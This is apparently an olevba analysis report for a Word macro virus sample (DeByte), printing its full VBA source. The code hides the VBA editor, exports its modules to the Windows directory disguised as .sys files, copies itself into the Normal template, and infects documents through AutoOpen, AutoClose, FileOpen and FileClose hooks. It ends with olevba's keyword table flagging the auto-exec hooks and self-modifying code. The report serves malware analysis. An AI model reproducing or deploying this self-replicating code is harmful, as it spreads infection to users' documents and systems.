olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO System.bas 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/System'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ViewVBCode(): Stealth: End Sub
Sub ToolsMacro(): Stealth: End Sub
Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth(): On Error Resume Next
Application.ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub


-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileOpen()
Dim vir_test As Byte
vir_test = 0
dialog_test = Dialogs(wdDialogFileOpen).Show
If dialog_test = 0 Then GoTo V_ok
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok
Call Infect_doc.Infect_doc
V_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
Dim vir_test As Byte

vir_test = 0
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok
Call Infect_doc.Infect_doc
V_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
Dim vir_test As Byte

vir_test = 0
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok
Call Infect_doc.Infect_doc
V_ok:
WordBasic.FileClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO Infect_doc.bas 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/Infect_doc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub Infect_doc()
Dim winda As String
Dim m(12)
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)

Randomize (Timer)
z = 0
max = 8
min = 1
For I = 1 To max
    m(I) = 0
Next I

start:
c = Int((max + min - 1) * Abs(Rnd) + min)
For I = 1 To max
    If c = m(I) Then c = 100
Next I
If c <> 100 Then: z = z + 1: m(z) = c
If z < max Then GoTo start

For I = 1 To max
If m(I) = 1 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv1.sys"
If m(I) = 2 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv2.sys"
If m(I) = 3 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv3.sys"
If m(I) = 4 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv4.sys"
If m(I) = 5 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv5.sys"
If m(I) = 6 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv6.sys"
If m(I) = 7 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv7.sys"
If m(I) = 8 Then ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv8.sys"
Next I
ActiveDocument.SaveAs
End Sub

-------------------------------------------------------------------------------
VBA MACRO Dead_Byte.bas 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/Dead_Byte'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Dead_Byte()
   'http://www.deadbyte.narod.ru
   
End Sub
-------------------------------------------------------------------------------
VBA MACRO Autoopen.bas 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/Autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoopen()
Call infect_normal.infect_normal
End Sub

-------------------------------------------------------------------------------
VBA MACRO infect_normal.bas 
in file: Virus.MSWord.DeByte-7c93fff19384176a405509864c9007bfef1c51d3 - OLE stream: 'Macros/VBA/infect_normal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub infect_normal()
Dim winda As String
Dim test_normal As Byte
test_normal = 0
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)
ActiveDocument.VBProject.VBComponents("Dead_Byte").Export winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents("FileOpen").Export winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents("AutoOpen").Export winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents("AutoClose").Export winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents("FileClose").Export winda + "\wdrv5.sys"
ActiveDocument.VBProject.VBComponents("Infect_doc").Export winda + "\wdrv6.sys"
ActiveDocument.VBProject.VBComponents("Infect_normal").Export winda + "\wdrv7.sys"
ActiveDocument.VBProject.VBComponents("System").Export winda + "\wdrv8.sys"
For I = 1 To WordBasic.CountMacros(0, 0)
 If WordBasic.[MacroName$](I, 0, 0) = "Dead_Byte" Then test_normal = 255
Next I
If test_normal = 255 Then GoTo ok
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Dead_Byte", "Normal:Dead_Byte"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Normal:FileOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "Normal:FileClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Normal:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Infect_doc", "Normal:Infect_doc"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Infect_normal", "Normal:Infect_normal"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":System", "Normal:System"
ok:
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.deadbyte.|URL                                          |
|          |narod.ru            |                                             |
+----------+--------------------+---------------------------------------------+
